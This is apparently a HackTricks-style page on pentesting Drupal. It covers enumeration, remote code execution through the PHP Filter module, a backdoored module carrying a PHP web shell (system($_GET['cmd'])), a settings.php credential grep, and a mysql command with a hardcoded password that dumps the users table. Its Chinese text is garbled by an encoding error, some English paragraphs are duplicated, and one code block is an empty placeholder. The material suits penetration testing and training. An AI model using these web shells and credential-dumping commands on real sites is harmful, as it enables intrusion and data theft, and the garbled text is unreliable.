# Drupal

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## å‘ç°

* æ£€æŸ¥**meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **èŠ‚ç‚¹**: Drupalä½¿ç”¨**èŠ‚ç‚¹æ¥ç´¢å¼•å…¶å†…å®¹**ã€‚ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥**åŒ…å«ä»»ä½•å†…å®¹**ï¼Œæ¯”å¦‚åšå®¢æ–‡ç« ã€æŠ•ç¥¨ã€æ–‡ç« ç­‰ã€‚é¡µé¢çš„URIé€šå¸¸é‡‡ç”¨`/node/<nodeid>`çš„å½¢å¼ã€‚
```bash
curl drupal-site.com/node/1
```
## æšä¸¾

Drupalé»˜è®¤æ”¯æŒ**ä¸‰ç§ç±»å‹çš„ç”¨æˆ·**ï¼š

1. **`ç®¡ç†å‘˜`**ï¼šè¯¥ç”¨æˆ·å¯¹Drupalç½‘ç«™æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒã€‚
2. **`å·²è®¤è¯ç”¨æˆ·`**ï¼šè¿™äº›ç”¨æˆ·å¯ä»¥ç™»å½•ç½‘ç«™ï¼Œå¹¶æ ¹æ®å…¶æƒé™æ‰§è¡Œæ·»åŠ å’Œç¼–è¾‘æ–‡ç« ç­‰æ“ä½œã€‚
3. **`åŒ¿åç”¨æˆ·`**ï¼šæ‰€æœ‰è®¿é—®ç½‘ç«™çš„ç”¨æˆ·éƒ½è¢«æŒ‡å®šä¸ºåŒ¿åç”¨æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›ç”¨æˆ·åªèƒ½é˜…è¯»æ–‡ç« ã€‚

### ç‰ˆæœ¬

* æ£€æŸ¥`/CHANGELOG.txt`æ–‡ä»¶
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
æ–°ç‰ˆæœ¬çš„Drupalé»˜è®¤é˜»æ­¢è®¿é—®`CHANGELOG.txt`å’Œ`README.txt`æ–‡ä»¶ã€‚
{% endhint %}

### ç”¨æˆ·åæšä¸¾

#### æ³¨å†Œ

åœ¨_/user/register_ä¸­å°è¯•åˆ›å»ºä¸€ä¸ªç”¨æˆ·åï¼Œå¦‚æœè¯¥åç§°å·²è¢«ä½¿ç”¨ï¼Œå°†ä¼šæ”¶åˆ°é€šçŸ¥ï¼š

![](<../../.gitbook/assets/image (254).png>)

#### è¯·æ±‚æ–°å¯†ç 

å¦‚æœæ‚¨ä¸ºç°æœ‰ç”¨æˆ·åè¯·æ±‚æ–°å¯†ç ï¼š

![](<../../.gitbook/assets/image (255).png>)

å¦‚æœæ‚¨ä¸ºä¸å­˜åœ¨çš„ç”¨æˆ·åè¯·æ±‚æ–°å¯†ç ï¼š

![](<../../.gitbook/assets/image (256).png>)

### è·å–ç”¨æˆ·æ•°é‡

è®¿é—®_/user/\<number>_ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ç°æœ‰ç”¨æˆ·çš„æ•°é‡ï¼Œä¾‹å¦‚åœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯2ï¼Œå› ä¸º_/users/3_è¿”å›ä¸€ä¸ªæœªæ‰¾åˆ°é”™è¯¯ï¼š

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### éšè—é¡µé¢

**æ¨¡ç³Šæœç´¢`/node/$`ï¼Œå…¶ä¸­`$`æ˜¯ä¸€ä¸ªæ•°å­—**ï¼ˆä¾‹å¦‚ä»1åˆ°500ï¼‰ã€‚\
æ‚¨å¯èƒ½ä¼šå‘ç°æœªè¢«æœç´¢å¼•æ“å¼•ç”¨çš„**éšè—é¡µé¢**ï¼ˆæµ‹è¯•ã€å¼€å‘ï¼‰ã€‚

#### å®‰è£…çš„æ¨¡å—ä¿¡æ¯
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### è‡ªåŠ¨åŒ–

Automatic testing tools can be very useful when it comes to pentesting Drupal websites. These tools can help identify common vulnerabilities and weaknesses in the Drupal installation, saving time and effort for the pentester.

è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·åœ¨æ¸—é€æµ‹è¯•Drupalç½‘ç«™æ—¶éå¸¸æœ‰ç”¨ã€‚è¿™äº›å·¥å…·å¯ä»¥å¸®åŠ©è¯†åˆ«Drupalå®‰è£…ä¸­çš„å¸¸è§æ¼æ´å’Œå¼±ç‚¹ï¼Œä¸ºæ¸—é€æµ‹è¯•äººå‘˜èŠ‚çœæ—¶é—´å’Œç²¾åŠ›ã€‚

#### Droopescan

[Droopescan](https://github.com/droope/droopescan) is a popular tool for scanning Drupal installations. It can identify the version of Drupal being used and check for known vulnerabilities. Droopescan can also perform password brute-forcing attacks against Drupal user accounts.

#### Droopescan

[Droopescan](https://github.com/droope/droopescan)æ˜¯ä¸€ä¸ªç”¨äºæ‰«æDrupalå®‰è£…çš„æµè¡Œå·¥å…·ã€‚å®ƒå¯ä»¥è¯†åˆ«æ­£åœ¨ä½¿ç”¨çš„Drupalç‰ˆæœ¬å¹¶æ£€æŸ¥å·²çŸ¥çš„æ¼æ´ã€‚Droopescanè¿˜å¯ä»¥å¯¹Drupalç”¨æˆ·è´¦æˆ·è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£æ”»å‡»ã€‚

#### Drupalgeddon

[Drupalgeddon](https://github.com/dreadlocked/Drupalgeddon2) is a tool specifically designed to exploit the Drupalgeddon vulnerability (CVE-2018-7600). This vulnerability allows remote code execution on Drupal versions 7.x and 8.x. The tool automates the exploitation process, making it easier for pentesters to test for this vulnerability.

#### Drupalgeddon

[Drupalgeddon](https://github.com/dreadlocked/Drupalgeddon2)æ˜¯ä¸€ä¸ªä¸“é—¨è®¾è®¡ç”¨äºåˆ©ç”¨Drupalgeddonæ¼æ´ï¼ˆCVE-2018-7600ï¼‰çš„å·¥å…·ã€‚è¯¥æ¼æ´å…è®¸åœ¨Drupal 7.xå’Œ8.xç‰ˆæœ¬ä¸Šè¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¯¥å·¥å…·è‡ªåŠ¨åŒ–äº†åˆ©ç”¨è¿‡ç¨‹ï¼Œä½¿æ¸—é€æµ‹è¯•äººå‘˜æ›´å®¹æ˜“æµ‹è¯•æ­¤æ¼æ´ã€‚

#### Drupal Security Scanner

[Drupal Security Scanner](https://github.com/immunIT/drupwn) is a Python tool that can scan Drupal websites for security vulnerabilities. It can identify outdated modules, misconfigurations, and other security issues. The tool also provides information about the Drupal version and installed modules.

#### Drupalå®‰å…¨æ‰«æå™¨

[Drupal Security Scanner](https://github.com/immunIT/drupwn)æ˜¯ä¸€ä¸ªPythonå·¥å…·ï¼Œå¯ä»¥æ‰«æDrupalç½‘ç«™çš„å®‰å…¨æ¼æ´ã€‚å®ƒå¯ä»¥è¯†åˆ«è¿‡æ—¶çš„æ¨¡å—ã€é…ç½®é”™è¯¯å’Œå…¶ä»–å®‰å…¨é—®é¢˜ã€‚è¯¥å·¥å…·è¿˜æä¾›æœ‰å…³Drupalç‰ˆæœ¬å’Œå·²å®‰è£…æ¨¡å—çš„ä¿¡æ¯ã€‚

#### CMSmap

[CMSmap](https://github.com/Dionach/CMSmap) is a versatile tool that can be used to scan various content management systems, including Drupal. It can identify the version of Drupal being used and check for common vulnerabilities. CMSmap can also perform brute-forcing attacks against Drupal user accounts.

#### CMSmap

[CMSmap](https://github.com/Dionach/CMSmap)æ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½å·¥å…·ï¼Œå¯ç”¨äºæ‰«æå„ç§å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ŒåŒ…æ‹¬Drupalã€‚å®ƒå¯ä»¥è¯†åˆ«æ­£åœ¨ä½¿ç”¨çš„Drupalç‰ˆæœ¬å¹¶æ£€æŸ¥å¸¸è§æ¼æ´ã€‚CMSmapè¿˜å¯ä»¥å¯¹Drupalç”¨æˆ·è´¦æˆ·è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»ã€‚
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰

### ä½¿ç”¨PHPè¿‡æ»¤å™¨æ¨¡å—

{% hint style="warning" %}
åœ¨æ—§ç‰ˆæœ¬çš„Drupalï¼ˆ8ç‰ˆæœ¬ä¹‹å‰ï¼‰ï¼Œå¯ä»¥ç™»å½•ä¸ºç®¡ç†å‘˜å¹¶å¯ç”¨`PHPè¿‡æ»¤å™¨`æ¨¡å—ï¼Œè¯¥æ¨¡å—"å…è®¸è¯„ä¼°åµŒå…¥çš„PHPä»£ç /ç‰‡æ®µ"ã€‚
{% endhint %}

æ‚¨éœ€è¦å®‰è£…**phpæ’ä»¶**ï¼ˆè®¿é—®_/modules/php_å¹¶è¿”å›**403**ï¼Œåˆ™**å·²å®‰è£…**ï¼›å¦‚æœ**æœªæ‰¾åˆ°**ï¼Œåˆ™**æœªå®‰è£…phpæ’ä»¶**ï¼‰ã€‚

è½¬åˆ°_æ¨¡å—_ -> ï¼ˆæ£€æŸ¥ï¼‰_PHPè¿‡æ»¤å™¨_ -> _ä¿å­˜é…ç½®_

![](<../../.gitbook/assets/image (247) (1).png>)

ç„¶åç‚¹å‡»_æ·»åŠ å†…å®¹_ -> é€‰æ‹©_åŸºæœ¬é¡µé¢_æˆ–_æ–‡ç« _ -> åœ¨_æ­£æ–‡_ä¸­ç¼–å†™_php shellcode_ -> åœ¨_æ–‡æœ¬æ ¼å¼_ä¸­é€‰æ‹©_PHPä»£ç _ -> é€‰æ‹©_é¢„è§ˆ_

![](<../../.gitbook/assets/image (253) (1).png>)

æœ€ååªéœ€è®¿é—®æ–°åˆ›å»ºçš„èŠ‚ç‚¹ï¼š
```bash
curl http://drupal-site.local/node/3
```
### å®‰è£… PHP Filter æ¨¡å—

ä»ç‰ˆæœ¬ **8 å¼€å§‹ï¼Œ**[**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **æ¨¡å—ä¸å†é»˜è®¤å®‰è£…**ã€‚è¦ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦**è‡ªå·±å®‰è£…æ¨¡å—**ã€‚

1. ä» Drupal ç½‘ç«™ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„æ¨¡å—ã€‚
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. ä¸‹è½½å®Œæˆåï¼Œè¿›å…¥ **`Administration`** > **`Reports`** > **`Available updates`**ã€‚
3. ç‚¹å‡» **`Browse`**ï¼Œé€‰æ‹©ä»ä¸‹è½½ç›®å½•ä¸­ä¸‹è½½çš„æ–‡ä»¶ï¼Œç„¶åç‚¹å‡» **`Install`**ã€‚
4. å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡» **`Content`** å¹¶**åˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬é¡µé¢**ï¼Œä¸åœ¨ Drupal 7 ç¤ºä¾‹ä¸­æ‰€åšçš„æ–¹å¼ç±»ä¼¼ã€‚å†æ¬¡ç¡®ä¿ä» **`Text format` ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© `PHP code`**ã€‚

### åé—¨æ¨¡å—

å¯ä»¥é€šè¿‡**å‘ç°æœ‰æ¨¡å—æ·»åŠ ä¸€ä¸ª shell**æ¥åˆ›å»ºåé—¨æ¨¡å—ã€‚å¯ä»¥åœ¨ drupal.org ç½‘ç«™ä¸Šæ‰¾åˆ°æ¨¡å—ã€‚è®©æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªæ¨¡å—ï¼Œæ¯”å¦‚ [CAPTCHA](https://www.drupal.org/project/captcha)ã€‚å‘ä¸‹æ»šåŠ¨å¹¶å¤åˆ¶ tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) çš„é“¾æ¥ã€‚

* ä¸‹è½½å­˜æ¡£å¹¶æå–å…¶å†…å®¹ã€‚
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* ä½¿ç”¨ä»¥ä¸‹å†…å®¹åˆ›å»ºä¸€ä¸ª **PHPç½‘ç»œå¤–å£³** ï¼š

```php
<?php
// PHP web shell code here
?>
```
```php
<?php
system($_GET["cmd"]);
?>
```
* æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª **`.htaccess`** æ–‡ä»¶æ¥è®©æˆ‘ä»¬è®¿é—®è¯¥æ–‡ä»¶å¤¹ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºDrupalæ‹’ç»ç›´æ¥è®¿é—® **`/modules`** æ–‡ä»¶å¤¹ã€‚
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* ä¸Šè¿°é…ç½®å°†åœ¨è¯·æ±‚/modulesæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶æ—¶åº”ç”¨è§„åˆ™ã€‚å°†è¿™ä¸¤ä¸ªæ–‡ä»¶éƒ½å¤åˆ¶åˆ°captchaæ–‡ä»¶å¤¹ä¸­å¹¶åˆ›å»ºä¸€ä¸ªå­˜æ¡£ã€‚
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* å‡è®¾æˆ‘ä»¬å¯¹ç½‘ç«™å…·æœ‰**ç®¡ç†å‘˜è®¿é—®æƒé™**ï¼Œç‚¹å‡»**`ç®¡ç†`**ï¼Œç„¶ååœ¨ä¾§è¾¹æ ä¸Šç‚¹å‡»**`æ‰©å±•`**ã€‚æ¥ä¸‹æ¥ï¼Œç‚¹å‡»**`+ å®‰è£…æ–°æ¨¡å—`**æŒ‰é’®ï¼Œæˆ‘ä»¬å°†è¢«å¸¦åˆ°å®‰è£…é¡µé¢ï¼Œä¾‹å¦‚`http://drupal-site.local/admin/modules/install`ã€‚æµè§ˆåˆ°å¸¦æœ‰åé—¨çš„éªŒè¯ç å­˜æ¡£å¹¶ç‚¹å‡»**`å®‰è£…`**ã€‚
* å®‰è£…æˆåŠŸåï¼Œæµè§ˆåˆ°**`/modules/captcha/shell.php`**ä»¥æ‰§è¡Œå‘½ä»¤ã€‚

## åæ¸—é€

### è¯»å–settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### ä»æ•°æ®åº“ä¸­å¯¼å‡ºç”¨æˆ·ä¿¡æ¯

To dump users from a Drupal database, you can use the following steps:

1. Identify the database credentials in the Drupal configuration file (`settings.php` or `settings.local.php`). Look for the variables `$databases` or `$database`.

2. Connect to the database using the obtained credentials. You can use tools like `mysql` or `phpMyAdmin` to access the database.

3. Once connected, execute the following SQL query to retrieve the user information:

```sql
SELECT name, mail FROM users;
```

This query will fetch the usernames and email addresses of all the users in the Drupal database.

4. Export the query results to a file for further analysis or processing. You can use the appropriate command or option provided by the database tool you are using.

By following these steps, you can successfully dump the user information from a Drupal database.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## å‚è€ƒèµ„æ–™

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
